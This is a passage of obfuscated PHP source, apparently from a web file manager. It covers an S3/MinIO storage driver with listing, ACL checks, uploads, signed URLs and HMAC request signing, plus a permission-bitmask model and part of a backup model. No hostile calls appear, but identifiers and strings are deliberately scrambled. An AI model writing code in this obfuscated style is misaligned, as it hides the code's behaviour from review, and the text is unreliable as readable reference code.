$this->listObjs($ıæßøßÜ, $¤–³…â, $âÖÄôñ, $ŠşÏ¥¦); if (!$²Ü’ˆ¯¼) { break; } $¤–³…â = $²Ü’ˆ¯¼[$†¨³¶µİ[216]]; $¼ºìğº” = $²Ü’ˆ¯¼[$†¨³¶µİ[214]]; $•®é©¾„ = $²Ü’ˆ¯¼[$†¨³¶µİ[215]]; if (empty($¼ºìğº”) && empty($•®é©¾„)) { break; } if (count($¼ºìğº”) == 1 && $¼ºìğº”[0][$†¨³¶µİ[32]] == $©„§æêª) { break; } if ($•ûÓÙ¨—) { if (count($¼ºìğº”)) { $¼ºìğº” = array_column($¼ºìğº”, $†¨³¶µİ[32]); $æŸ±ºÈŠ = array_merge($æŸ±ºÈŠ, $¼ºìğº”); } if (count($•®é©¾„)) { $•®é©¾„ = array_column($•®é©¾„, $†¨³¶µİ[32]); $™œÜÜÆå = array_merge($™œÜÜÆå, $•®é©¾„); } if ($¤–³…â === null) { break; } continue; } if ($÷‘Ş‘ÃÅ) { if (!empty($¼ºìğº”)) { if (count($¼ºìğº”) > 1 || isset($¼ºìğº”[0][$†¨³¶µİ[32]]) && $¼ºìğº”[0][$†¨³¶µİ[32]] != $©„§æêª) { return !0; } } } else { if (!empty($•®é©¾„)) { return !0; } } if ($¤–³…â === null) { break; } } if ($•ûÓÙ¨—) { $æŸ±ºÈŠ = array_diff($æŸ±ºÈŠ, array($©„§æêª)); $æŸ±ºÈŠ = count(array_unique($æŸ±ºÈŠ)); $™œÜÜÆå = count(array_unique($™œÜÜÆå)); return array($†¨³¶µİ[217] => $æŸ±ºÈŠ, $†¨³¶µİ[218] => $™œÜÜÆå); } return !1; } public function listAll($Ğ¿”³İ¡) { $Úâ‡§¢½ =& $_SERVER[„Ç©ñÎ©]; $Çé€ÄÂ = $this->fileList($Ğ¿”³İ¡, $Úâ‡§¢½[12], !0); $ÀÁù¤Š¢ = array(); foreach ($Çé€ÄÂ[$Úâ‡§¢½[93]] as $‹—Â²÷ó) { $ÀÁù¤Š¢[$‹—Â²÷ó[$Úâ‡§¢½[32]]] = $‹—Â²÷ó[$Úâ‡§¢½[86]]; } foreach ($Çé€ÄÂ[$Úâ‡§¢½[92]] as $‹—Â²÷ó) { if (is_string($‹—Â²÷ó)) { $ÀÁù¤Š¢[$‹—Â²÷ó] = 0; } } return $this->listAllFiles($Ğ¿”³İ¡, array_keys($ÀÁù¤Š¢), $ÀÁù¤Š¢); } public function canRead($¸—Ô‡€ø) { $¶É‡Ÿş =& $_SERVER[„Ç©ñÎ©]; $ÂÃ§‡ÊÀ = $this->client->getAccessControlPolicy($this->bucket, $¸—Ô‡€ø); if (!$ÂÃ§‡ÊÀ) { return !1; } return in_array($ÂÃ§‡ÊÀ, array($¶É‡Ÿş[219], $¶É‡Ÿş[220], $¶É‡Ÿş[221])) ? !0 : !1; } public function canWrite($ğááåï‰) { $‘¼’³» =& $_SERVER[„Ç©ñÎ©]; $‚¯Ê¬ = $this->client->getAccessControlPolicy($this->bucket, $ğááåï‰); if (!$‚¯Ê¬) { return !1; } return in_array($‚¯Ê¬, array($‘¼’³»[219], $‘¼’³»[220])) ? !0 : !1; } public function getContent($ÉäØ¦­Æ) { return $this->client->getObject($this->bucket, $ÉäØ¦­Æ); } public function setContent($è­ÁÕÛï, $şûÅÌğĞ = '', $Ë»œèı€ = false) { $şá±íáŠ =& $_SERVER[„Ç©ñÎ©]; $è­ÁÕÛï = $Ë»œèı€ ? trim($è­ÁÕÛï, $şá±íáŠ[8]) . $şá±íáŠ[8] : $è­ÁÕÛï; $æƒ¸÷Ÿ¬ = get_file_mime(get_path_ext($è­ÁÕÛï)); $æô ß¡ = $this->client->putObject($şûÅÌğĞ, $this->bucket, $è­ÁÕÛï, $şá±íáŠ[208], array(), $æƒ¸÷Ÿ¬); if (!$æô ß¡) { return !1; } if ($Ë»œèı€) { return !0; } $this->cacheMethod(null, null); $æô ß¡ = $this->copyFile($è­ÁÕÛï, $è­ÁÕÛï, array($şá±íáŠ[222] => $æô ß¡[$şá±íáŠ[223]])); return $æô ß¡ ? !0 : !1; } public function fileSubstr($ıÖÃĞ®, $Ñ¸¥ÌÄ¡, $÷í˜ªÚ•) { $–âğĞ¬÷ = $Ñ¸¥ÌÄ¡ + $÷í˜ªÚ• - 1; return $this->client->getObject($this->bucket, $ıÖÃĞ®, array($_SERVER[„Ç©ñÎ©][224] => "\x62\x79\x74\145\x73\x3d{$Ñ¸¥ÌÄ¡}\55{$–âğĞ¬÷}")); } public function upload($ŞŸê²ğ˜, $Ÿòš™ı’, $òóâ†ù = false, $Ğ”åúõ‘ = REPEAT_REPLACE) { $óÄ‰ŸÌ =& $_SERVER[„Ç©ñÎ©]; $¿ÄÄÚÛ­ = array($óÄ‰ŸÌ[222] => @md5_file($Ÿòš™ı’)); $Ã© ÖÒ¼ = array($óÄ‰ŸÌ[225] => get_file_mime(get_path_ext($ŞŸê²ğ˜))); if (IO::size($Ÿòš™ı’) <= 1024 * 1024 * 200) { $ÑÇ¤şÑ = $this->client->putObjectFile($Ÿòš™ı’, $this->bucket, $ŞŸê²ğ˜, $óÄ‰ŸÌ[208], $¿ÄÄÚÛ­, $Ã© ÖÒ¼); return !empty($ÑÇ¤şÑ) ? $this->getPathOuter($ŞŸê²ğ˜) : !1; } $¢†ª‡œ— = $this->client->multiUploadObject($Ÿòš™ı’, $this->bucket, trim($ŞŸê²ğ˜, $óÄ‰ŸÌ[8]), $¿ÄÄÚÛ­, $Ã© ÖÒ¼); return $¢†ª‡œ— ? $this->getPathOuter($ŞŸê²ğ˜) : !1; } public function download($ªõùˆø», $•«Õö) { if (!@is_dir($this->pathFather($•«Õö)) && !IO::mkdir($this->pathFather($•«Õö))) { return !1; } $“çğšŒ = $this->client->getObject($this->bucket, $ªõùˆø», array(), $•«Õö); return $“çğšŒ !== !1 ? $•«Õö : !1; } public function link($ñÚË•ÂÜ, $çæ’úÚ™ = array()) { $Æî¸£¹ê =& $_SERVER[„Ç©ñÎ©]; if ($this->signVer == $Æî¸£¹ê[226]) { return $this->client->getAuthenticatedURL($this->bucket, $ñÚË•ÂÜ, 3600 * 12, $çæ’úÚ™); } return $this->client->getObjectUrl($this->accessKey, $this->secret, $this->bucket, trim($ñÚË•ÂÜ, $Æî¸£¹ê[8]), 3600 * 12, $this->region, array(), !0, $çæ’úÚ™); } public function fileOut($ÊÖÍÚšĞ, $‘©¾ÈÆÒ = false, $ÏÚ Úö® = false, $ÔÛê…— = '') { $Ñ÷Ã÷–“ =& $_SERVER[„Ç©ñÎ©]; if ($this->isFileOutServer()) { return $this->fileOutServer($ÊÖÍÚšĞ, $‘©¾ÈÆÒ, $ÏÚ Úö®, $ÔÛê…—); } if (!$ÏÚ Úö®) { $ÏÚ Úö® = $this->pathThis($ÊÖÍÚšĞ); } $§«¢Í›£ = get_file_mime(get_path_ext($ÏÚ Úö®)); if ($§«¢Í›£ == $Ñ÷Ã÷–“[227]) { return parent::fileOut($ÊÖÍÚšĞ, $‘©¾ÈÆÒ, $ÏÚ Úö®, $ÔÛê…—); } $Ş…ûÑ¯® = array($Ñ÷Ã÷–“[228] => $§«¢Í›£); if ($‘©¾ÈÆÒ) { $Ş…ûÑ¯®[$Ñ÷Ã÷–“[229]] = $Ñ÷Ã÷–“[230] . rawurlencode($ÏÚ Úö®); } else { } $µß‹°Ó¬ = $this->link($ÊÖÍÚšĞ, $Ş…ûÑ¯®); $this->fileOutLink($µß‹°Ó¬); } public function fileOutServer($ºÕóäªñ, $ŒÜ¥åÛƒ = false, $¼˜æ”¤ = false, $Ö·ëÔ„ñ = '') { parent::fileOut($ºÕóäªñ, $ŒÜ¥åÛƒ, $¼˜æ”¤, $Ö·ëÔ„ñ); } public function fileOutImageServer($ñøÍ“Úµ, $øğÚ«şó = 250) { parent::fileOutImage($ñøÍ“Úµ, $øğÚ«şó); } public function hashMd5($€ğÙ³§, $ÜÛ£ü³¹ = '') { $³¡Ñœä£ =& $_SERVER[„Ç©ñÎ©]; $ù§ñø‡ = $this->objectMeta($€ğÙ³§); if (!$ù§ñø‡) { return !1; } $ÜÛ£ü³¹ = $ÜÛ£ü³¹ ? $ÜÛ£ü³¹ : _get($ù§ñø‡, $³¡Ñœä£[231]); $ÜÛ£ü³¹ = $ÜÛ£ü³¹ ? $ÜÛ£ü³¹ : _get($ù§ñø‡, $³¡Ñœä£[223], $³¡Ñœä£[12]); return $ÜÛ£ü³¹; } public function uploadFormData($˜Àø¯ß, $ÚÓÃ½¬• = 3600) { $®’’¤íõ =& $_SERVER[„Ç©ñÎ©]; $«šêöó = $this->pathFather($˜Àø¯ß); $¸¦ì›ç = $this->client->getHttpUploadPostParams($this->bucket, $«šêöó, $®’’¤íõ[208], $ÚÓÃ½¬•); return array_merge((array) $¸¦ì›ç, array($®’’¤íõ[191] => $this->getHost())); } public function multiUploadFormData($»Ÿôõøš, $¸çæÀş€ = 3600) { $Ü“éÀ¬ø =& $_SERVER[„Ç©ñÎ©]; $œ³–Š¶– = gmdate($Ü“éÀ¬ø[232]); $£ü­²ÃÃ = array(); $“ë÷¶³‹ = $this->client->getUploadId($this->bucket, $»Ÿôõøš, $£ü­²ÃÃ); if (!$“ë÷¶³‹) { return !1; } return array($Ü“éÀ¬ø[233] => $“ë÷¶³‹, $Ü“éÀ¬ø[191] => $this->getHost() . $Ü“éÀ¬ø[8] . $this->pathEncode($»Ÿôõøš), $Ü“éÀ¬ø[234] => $œ³–Š¶–, $Ü“éÀ¬ø[104] => $»Ÿôõøš); } public function multiUploadAuthData($²´ËâÁ, $‹‡½Ëä = array()) { $†ò°–‡¡ =& $_SERVER[„Ç©ñÎ©]; $­±˜í÷õ = isset($‹‡½Ëä[$†ò°–‡¡[234]]) ? $‹‡½Ëä[$†ò°–‡¡[234]] : gmdate($†ò°–‡¡[232]); $ƒíñõƒı = isset($‹‡½Ëä[$†ò°–‡¡[184]]) ? $‹‡½Ëä[$†ò°–‡¡[184]] : $†ò°–‡¡[12]; $Ì² ¼ = $‹‡½Ëä[$†ò°–‡¡[104]]; unset($‹‡½Ëä[$†ò°–‡¡[104]]); if (isset($‹‡½Ëä[$†ò°–‡¡[235]])) { $‹‡½Ëä[$†ò°–‡¡[234]] = $­±˜í÷õ; return $this->listUploadParts($Ì² ¼, $‹‡½Ëä); } $ñ‰ôËòˆ = array($†ò°–‡¡[236], $†ò°–‡¡[12], $†ò°–‡¡[130], $†ò°–‡¡[12], "\x78\x2d\141\x6d\x7a\x2d\x64\x61\x74\x65\x3a{$­±˜í÷õ}", $†ò°–‡¡[8] . $this->bucket . $†ò°–‡¡[8] . $this->pathEncode($Ì² ¼) . $ƒíñõƒı); if (strpos($ƒíñõƒı, $†ò°–‡¡[237]) === 0) { $ñ‰ôËòˆ[0] = $†ò°–‡¡[238]; } if (isset($‹‡½Ëä[$†ò°–‡¡[239]]) && $‹‡½Ëä[$†ò°–‡¡[239]] == $†ò°–‡¡[240]) { $ñ‰ôËòˆ[0] = $†ò°–‡¡[240]; } $³ã¼·Öì = implode($†ò°–‡¡[66], $ñ‰ôËòˆ); $ÎÀó«¤ = base64_encode(hash_hmac($†ò°–‡¡[241], $³ã¼·Öì, $this->secret, !0)); $‡«Äö»ı = $†ò°–‡¡[242] . $this->accessKey . $†ò°–‡¡[4] . $ÎÀó«¤; if (strpos($ƒíñõƒı, $†ò°–‡¡[237]) === 0) { return array($†ò°–‡¡[243] => $‡«Äö»ı, $†ò°–‡¡[234] => $­±˜í÷õ); } return $‡«Äö»ı; } public function listUploadParts($¾ûÛ›È, $øÑùÄÕ„ = array()) { $‚Ï„Ë¾ =& $_SERVER[„Ç©ñÎ©]; $–©Ó„¢ß = str_replace($‚Ï„Ë¾[244], $‚Ï„Ë¾[12], $øÑùÄÕ„[$‚Ï„Ë¾[184]]); $Ş€ãğƒƒ = $this->client->listParts($this->bucket, $¾ûÛ›È, $–©Ó„¢ß); if (!$Ş€ãğƒƒ) { return !1; } unset($øÑùÄÕ„[$‚Ï„Ë¾[235]], $øÑùÄÕ„[$‚Ï„Ë¾[239]]); $øÑùÄÕ„[$‚Ï„Ë¾[104]] = $¾ûÛ›È; $«ñÒîò = $this->multiUploadAuthData($¾ûÛ›È, $øÑùÄÕ„); if (empty($«ñÒîò)) { return !1; } return array($‚Ï„Ë¾[243] => $«ñÒîò, $‚Ï„Ë¾[234] => $øÑùÄÕ„[$‚Ï„Ë¾[234]], $‚Ï„Ë¾[245] => $Ş€ãğƒƒ); } public function getHost() { return parent::getHost() . $_SERVER[„Ç©ñÎ©][8] . $this->bucket; } public function size($¸¤ÖÃºø) { $ù˜“ äÎ = $this->objectMeta($¸¤ÖÃºø); return $ù˜“ äÎ ? $ù˜“ äÎ[$_SERVER[„Ç©ñÎ©][86]] : 0; } public function info($Ø–¢ÃŒ) { if ($this->isFolder($Ø–¢ÃŒ)) { return $this->folderInfo($Ø–¢ÃŒ); } else { if ($this->isFile($Ø–¢ÃŒ)) { return $this->fileInfo($Ø–¢ÃŒ); } } return !1; } public function exist($–ğ¼†Áƒ) { return $this->isFile($–ğ¼†Áƒ) || $this->isFolder($–ğ¼†Áƒ); } public function isFile($¶È÷Í×£) { return !$this->isFolder($¶È÷Í×£) && $this->objectMeta($¶È÷Í×£); } public function isFolder($¿µÊ‹Ù) { return $this->cacheMethod($_SERVER[„Ç©ñÎ©][175], $¿µÊ‹Ù); } protected function objectMeta($³ø›Ú¯Õ) { return $this->cacheMethod($_SERVER[„Ç©ñÎ©][177], $³ø›Ú¯Õ); } protected function _objectMeta($¬åÌ¤ªé) { $¥Ê¼ä›è =& $_SERVER[„Ç©ñÎ©]; $¬åÌ¤ªé = rtrim($¬åÌ¤ªé, $¥Ê¼ä›è[8]); try { $¾ÜˆúÛÃ = $this->client->getObjectInfo($this->bucket, $¬åÌ¤ªé); if (!isset($¾ÜˆúÛÃ[$¥Ê¼ä›è[231]]) && isset($¾ÜˆúÛÃ[$¥Ê¼ä›è[246]])) { $¾ÜˆúÛÃ[$¥Ê¼ä›è[231]] = $¾ÜˆúÛÃ[$¥Ê¼ä›è[246]]; } } catch (Exception $ñ¿¼Û…) { $¾ÜˆúÛÃ = !1; } if (!$¾ÜˆúÛÃ) { } return $¾ÜˆúÛÃ; } protected function _isFolder($ÙÒ«±öÆ) { $Ò–šŠÏË =& $_SERVER[„Ç©ñÎ©]; $ÙÒ«±öÆ = rtrim($ÙÒ«±öÆ, $Ò–šŠÏË[8]); if ($ÙÒ«±öÆ == $Ò–šŠÏË[12] || $ÙÒ«±öÆ == $Ò–šŠÏË[8]) { return !0; } $²òÁ‡ = $this->client->getBucket($this->bucket, $ÙÒ«±öÆ, null, 1); if (empty($²òÁ‡[$Ò–šŠÏË[214]])) { return !1; } $ú³Ã÷û = $²òÁ‡[$Ò–šŠÏË[214]][0][$Ò–šŠÏË[32]]; return stripos($ú³Ã÷û, $ÙÒ«±öÆ . $Ò–šŠÏË[8]) === 0 ? !0 : !1; if (substr($ú³Ã÷û, -1) == $Ò–šŠÏË[8]) { return !0; } if (get_path_this($ú³Ã÷û) == get_path_this($ÙÒ«±öÆ)) { return !1; } return !0; } } class PathDriverMinIO extends PathDriverBaseS3 { public function __construct($×Ã³ÊÉ¤) { parent::__construct($×Ã³ÊÉ¤); $this->signatureVersion($_SERVER[„Ç©ñÎ©][226]); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } } goto aîê°±Ü; FÉÏ‹˜…®Æ: class AuthModel extends ModelBaseLight { const AUTH_SHOW = 1; const AUTH_VIEW = 2; const AUTH_DOWNLOAD = 4; const AUTH_UPLOAD = 8; const AUTH_EDIT = 16; const AUTH_REMOVE = 32; const AUTH_SHARE = 64; const AUTH_COMMENT = 128; const AUTH_EVENT = 256; const AUTH_ROOT = 33554432; public static function authAll() { return self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT; } public static function authDefault() { $Û»Î·øÕ =& $_SERVER[„Ç©ñÎ©]; $›Ğ¡Ëş· = array(array($Û»Î·øÕ[429] => LNG($Û»Î·øÕ[1828]), $Û»Î·øÕ[1829] => $Û»Î·øÕ[1830], $Û»Î·øÕ[1831] => 1, $Û»Î·øÕ[1832] => 1, $Û»Î·øÕ[1833] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT), array($Û»Î·øÕ[429] => LNG($Û»Î·øÕ[1834]), $Û»Î·øÕ[1829] => $Û»Î·øÕ[1835], $Û»Î·øÕ[1831] => 2, $Û»Î·øÕ[1832] => 1, $Û»Î·øÕ[1833] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_COMMENT | self::AUTH_EVENT), array($Û»Î·øÕ[429] => LNG($Û»Î·øÕ[1836]), $Û»Î·øÕ[1829] => $Û»Î·øÕ[1837], $Û»Î·øÕ[1831] => 3, $Û»Î·øÕ[1832] => 1, $Û»Î·øÕ[1833] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_COMMENT | self::AUTH_EVENT), array($Û»Î·øÕ[429] => LNG($Û»Î·øÕ[1838]), $Û»Î·øÕ[1829] => $Û»Î·øÕ[1839], $Û»Î·øÕ[1831] => 4, $Û»Î·øÕ[1832] => 1, $Û»Î·øÕ[1833] => self::AUTH_SHOW | self::AUTH_VIEW), array($Û»Î·øÕ[429] => LNG($Û»Î·øÕ[1840]), $Û»Î·øÕ[1829] => $Û»Î·øÕ[1841], $Û»Î·øÕ[1831] => 5, $Û»Î·øÕ[1832] => 1, $Û»Î·øÕ[1833] => self::AUTH_SHOW | self::AUTH_UPLOAD), array($Û»Î·øÕ[429] => LNG($Û»Î·øÕ[1842]), $Û»Î·øÕ[1829] => $Û»Î·øÕ[1843], $Û»Î·øÕ[1831] => 6, $Û»Î·øÕ[1832] => 1, $Û»Î·øÕ[1833] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT), array($Û»Î·øÕ[429] => LNG($Û»Î·øÕ[1844]), $Û»Î·øÕ[1829] => $Û»Î·øÕ[1845], $Û»Î·øÕ[1831] => 7, $Û»Î·øÕ[1832] => 1, $Û»Î·øÕ[1833] => 0)); return $›Ğ¡Ëş·; } public static function authCheck($ó·ÍŒ·ò, $òÇö €) { $”Ì½ÈÓ© =& $_SERVER[„Ç©ñÎ©]; $ó·ÍŒ·ò = intval($ó·ÍŒ·ò); if ($GLOBALS[$”Ì½ÈÓ©[512]] && $GLOBALS[$”Ì½ÈÓ©[6]][$”Ì½ÈÓ©[1846]]) { return !0; } if ($ó·ÍŒ·ò <= 0) { return !1; } if (($ó·ÍŒ·ò & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($ó·ÍŒ·ò & $òÇö €); } public static function authCheckShow($ª’Áâñø) { return self::authCheck($ª’Áâñø, self::AUTH_SHOW); } public static function authCheckView($ÈÉ®©†Ê) { return self::authCheck($ÈÉ®©†Ê, self::AUTH_VIEW); } public static function authCheckDownload($òÀÛ¿Ú‰) { return self::authCheck($òÀÛ¿Ú‰, self::AUTH_DOWNLOAD); } public static function authCheckUpload($Ş´õØ) { return self::authCheck($Ş´õØ, self::AUTH_UPLOAD); } public static function authCheckEdit($™¦Õ·Â») { return self::authCheck($™¦Õ·Â», self::AUTH_EDIT); } public static function authCheckRemove($º¾œŠ¸Ö) { return self::authCheck($º¾œŠ¸Ö, self::AUTH_REMOVE); } public static function authCheckShare($œ’¨¤ü¬) { return self::authCheck($œ’¨¤ü¬, self::AUTH_SHARE); } public static function authCheckComment($ŸüœĞïô) { return self::authCheck($ŸüœĞïô, self::AUTH_COMMENT); } public static function authCheckEvent($şÂÀíÇ) { return self::authCheck($şÂÀíÇ, self::AUTH_EVENT); } public static function authCheckRoot($’¬Äé¨) { return self::authCheck($’¬Äé¨, self::AUTH_ROOT); } public static function authCheckAction($÷ç—Ÿ³±, $·á¡Ìà­) { $¼º„Ê— =& $_SERVER[„Ç©ñÎ©]; $êˆı°ãÌ = array($¼º„Ê—[1847] => self::AUTH_VIEW, $¼º„Ê—[1198] => self::AUTH_DOWNLOAD, $¼º„Ê—[117] => self::AUTH_UPLOAD, $¼º„Ê—[1797] => self::AUTH_EDIT, $¼º„Ê—[1796] => self::AUTH_REMOVE, $¼º„Ê—[1807] => self::AUTH_SHARE, $¼º„Ê—[363] => self::AUTH_COMMENT, $¼º„Ê—[1643] => self::AUTH_EVENT, $¼º„Ê—[1848] => self::AUTH_ROOT); if (!isset($êˆı°ãÌ[$·á¡Ìà­])) { return; } $î÷½ˆÈ = $êˆı°ãÌ[$·á¡Ìà­]; $÷ç—Ÿ³± = intval($÷ç—Ÿ³±); if ($÷ç—Ÿ³± <= 0) { return !1; } if (($÷ç—Ÿ³± & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($÷ç—Ÿ³± & $î÷½ˆÈ); } public static function authDisable($­˜»Ì´‹, $ÌÀ¹©í) { if (intval($­˜»Ì´‹) <= 0) { return 0; } return intval($­˜»Ì´‹) & ~$ÌÀ¹©í; } public $optionType = "\123\x79\x73\164\145\155\56\x73\157\165\162\143\x65\x41\165\164\150\114\x69\x73\x74"; public $field = array("\156\x61\x6d\145", "\x61\165\x74\x68", "\154\141\142\145\154", "\x64\151\163\x70\154\x61\171", "\x73\171\x73\x74\x65\x6d", "\x73\x6f\x72\x74"); public function initData() { $­ÛûÑøá = $this->authDefault(); foreach ($­ÛûÑøá as $ôÈˆáô) { $this->add($ôÈˆáô); } } public function findAuth($µœ”ñ¯ö, $ÀæŞè•Ä) { $Ì‚âøğº =& $_SERVER[„Ç©ñÎ©]; $‚á¨ı­Ô = parent::listData(); foreach ($‚á¨ı­Ô as $“—§ü) { $ôÅÒ Âû = intval($“—§ü[$Ì‚âøğº[422]]); if ($ôÅÒ Âû <= 0 || $“—§ü[$Ì‚âøğº[1849]] == 0) { continue; } if (($ôÅÒ Âû & $µœ”ñ¯ö) != $µœ”ñ¯ö) { continue; } if (($ôÅÒ Âû & $ÀæŞè•Ä) != 0) { continue; } return $“—§ü[$Ì‚âøğº[408]]; } return !1; } public function findAuthReadOnly() { $üØÅä÷¡ = self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD; $ÒÊô·æ = self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE; return $this->findAuth($üØÅä÷¡, $ÒÊô·æ); } public function findAuthNotRead() { return $this->findAuth(0, self::AUTH_SHOW); } public function findAuthMinDefault() { $õ°ùæÚÁ =& $_SERVER[„Ç©ñÎ©]; $¹ó¿§Ìú = parent::listData(); $Úôû ì = !1; foreach ($¹ó¿§Ìú as $¢õÖ¥Üú) { if ($¢õÖ¥Üú[$õ°ùæÚÁ[422]] <= 0 || $¢õÖ¥Üú[$õ°ùæÚÁ[1849]] == $õ°ùæÚÁ[207]) { continue; } if (!$Úôû ì) { $Úôû ì = $¢õÖ¥Üú; continue; } if ($Úôû ì[$õ°ùæÚÁ[422]] > $¢õÖ¥Üú[$õ°ùæÚÁ[422]]) { $Úôû ì = $¢õÖ¥Üú; } } return $Úôû ì ? $Úôû ì[$õ°ùæÚÁ[408]] : $õ°ùæÚÁ[12]; } public function listData($»›¶åå× = false, $€¢â´Í¥ = "\x73\157\162\x74", $ï¨óÔÕ® = false) { return parent::listData($»›¶åå×, $€¢â´Í¥, $ï¨óÔÕ®); } public function update($…ÒÍÖáå, $Ç´“°˜) { $Âå¾‡Ú” =& $_SERVER[„Ç©ñÎ©]; $×õ¿ÃÅ– = parent::listData($…ÒÍÖáå); $şŒ„éíÁ = $this->findByName($Ç´“°˜[$Âå¾‡Ú”[32]]); if (!$×õ¿ÃÅ– || $şŒ„éíÁ && $şŒ„éíÁ[$Âå¾‡Ú”[408]] != $×õ¿ÃÅ–[$Âå¾‡Ú”[408]]) { return !1; } $this->filterAuth($Ç´“°˜[$Âå¾‡Ú”[422]]); return parent::update($…ÒÍÖáå, $Ç´“°˜); } public function remove($µØ¶ÛÈ‹) { $„ï¹Äö… = parent::listData($µØ¶ÛÈ‹); if (!$„ï¹Äö… || $„ï¹Äö…[$_SERVER[„Ç©ñÎ©][1275]]) { return !1; } return parent::remove($µØ¶ÛÈ‹); } public function add($ ÌÚşÓÎ = array()) { $¸Öğ¯ºÕ =& $_SERVER[„Ç©ñÎ©]; if ($this->findByName($ ÌÚşÓÎ[$¸Öğ¯ºÕ[32]])) { return !1; } $Ãá½·² = array($¸Öğ¯ºÕ[32] => $¸Öğ¯ºÕ[12], $¸Öğ¯ºÕ[422] => 1, $¸Öğ¯ºÕ[1850] => $¸Öğ¯ºÕ[1837], $¸Öğ¯ºÕ[1849] => 1, $¸Öğ¯ºÕ[1275] => 0, $¸Öğ¯ºÕ[1851] => 0); $ ÌÚşÓÎ = array_merge($Ãá½·², $ ÌÚşÓÎ); $ ÌÚşÓÎ[$¸Öğ¯ºÕ[1851]] = $this->getSort(); $this->filterAuth($ ÌÚşÓÎ[$¸Öğ¯ºÕ[422]]); return parent::insert($ ÌÚşÓÎ); } private function getSort() { $Éëî‘úÖ =& $_SERVER[„Ç©ñÎ©]; $Äù‚©µú = parent::listData(); $ãŠò–Ÿ = array_to_keyvalue($Äù‚©µú, $Éëî‘úÖ[12], $Éëî‘úÖ[1851]); return empty($ãŠò–Ÿ) ? 0 : max($ãŠò–Ÿ) + 1; } private function filterAuth(&$“™Éş‡ˆ) { if (!$“™Éş‡ˆ) { return; } $ò¬æ©à« = array(self::AUTH_SHOW, self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT, self::AUTH_REMOVE, self::AUTH_SHARE, self::AUTH_COMMENT, self::AUTH_EVENT, self::AUTH_ROOT); $Ú“ì¼å = array(); foreach ($ò¬æ©à« as $û€›ò‚¹) { if ($“™Éş‡ˆ & $û€›ò‚¹) { $Ú“ì¼å[] = $û€›ò‚¹; } } if (in_array(self::AUTH_ROOT, $Ú“ì¼å)) { $“™Éş‡ˆ = array_sum($ò¬æ©à«); return; } $ÉíğÈû© = array(self::AUTH_DOWNLOAD => array(self::AUTH_VIEW), self::AUTH_EDIT => array(self::AUTH_VIEW), self::AUTH_REMOVE => array(self::AUTH_EDIT), self::AUTH_SHARE => array(self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT)); foreach ($Ú“ì¼å as $û€›ò‚¹) { if (isset($ÉíğÈû©[$û€›ò‚¹])) { $Ú“ì¼å = array_merge($Ú“ì¼å, $ÉíğÈû©[$û€›ò‚¹]); } } $Ú“ì¼å[] = self::AUTH_SHOW; $“™Éş‡ˆ = array_sum(array_unique($Ú“ì¼å)); } public function sort($Á¼üÒæ, $“Ùîê”ª) { return parent::update($Á¼üÒæ, $“Ùîê”ª); } } class BackupModel extends ModelBaseLight { public $optionType = "\123\171\163\164\145\x6d\x2e\142\141\x63\153\165\x70\114\151\163\x74"; public $field = array("\x69\157", "\156\x61\x6d\145", "\163\164\x61\164\x75\x73", "\143\x6f\x6e\x74\x65\x6e\164", "\155\x61\x6e\x75\141\154", "\162\145\163\x75\x6c\x74", "\164\x69\x6d\x65\x46\162\157\155", "\164\151\155\x65\124\157"); public function config() { $ö”¬õØ =& $_SERVER[„Ç©ñÎ©]; $½°¿¢½„ = Model($ö”¬õØ[773])->get($ö”¬õØ[783]); $½°¿¢½„ = json_decode($½°¿¢½„, !0); $½°¿¢½„ = is_array($½°¿¢½„) ? $½°¿¢½„ : array(); if (!isset($½°¿¢½„[$ö”¬õØ[758]])) { $½°¿¢½„[$ö”¬õØ[758]] = $ö”¬õØ[98]; } unset($½°¿¢½„[$ö”¬õØ[1625]]); Action($ö”¬õØ[1852])->taskInit(); Model($ö”¬õØ[1624])->cacheClear(); $é¹ùğó = $ö”¬õØ[1853]; $î»Á¾ù€ = Model($ö”¬õØ[1854])->findByKey($ö”¬õØ[1643], $é¹ùğó); if (!$î»Á¾ù€) { $î»Á¾ù€ = array(); } if (isset($î»Á¾ù€[$ö”¬õØ[213]])) { $î»Á¾ù€[$ö”¬õØ[213]] = json_decode($î»Á¾ù€[$ö”¬õØ[213]], !0); } if (isset($½°¿¢½„[$ö”¬õØ[213]])) { $î»Á¾ù€[$ö”¬õØ[213]][$ö”¬õØ[1628]] = $½°¿¢½„[$ö”¬õØ[213]]; unset($½°¿¢½„[$ö”¬õØ[213]]); } return array_merge($î»Á¾ù€, $½°¿¢½„); } public function listData($åÓ©‹‹… = false, $óİíöú = "\x6d\157\x64\x69\x66\171\124\x69\155\x65", $ÁãÖ¼¹ = false) { return parent::listData($åÓ©‹‹…, $óİíöú, !0); } public function lastItem() { $æœäûêº = $this->listData(); return !empty($æœäûêº[0]) ? $æœäûêº[0] : null; } public function kill($‘…°±Íı) { $Ò”±ïËî =& $_SERVER[„Ç©ñÎ©]; $³™¿ÔÓ‰ = $this->listData($‘…°±Íı); if (!$³™¿ÔÓ‰ || empty($³™¿ÔÓ‰[$Ò”±ïËî[32]])) { return !0; } Task::kill($Ò”±ïËî[782]); Task::kill($Ò”±ïËî[803]); 